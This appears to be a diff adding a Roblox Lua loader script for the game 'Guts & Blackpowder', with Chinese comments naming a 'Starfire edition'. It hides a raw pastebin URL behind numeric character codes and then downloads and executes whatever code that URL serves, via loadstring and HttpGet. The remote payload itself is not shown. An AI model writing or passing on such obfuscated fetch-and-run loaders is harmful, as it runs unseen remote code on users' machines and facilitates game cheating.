@@ -1,0 +1,6 @@
+local SCC_CharPool={
+[1]= tostring(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,51,55,116,67,82,116,117,109})end)()))}
+---内脏与黑火药星火交辉版
+loadstring(game:HttpGet(SCC_CharPool[1]))()
+
+--内脏与黑火药guts&blackpowder清风(星火交辉版)
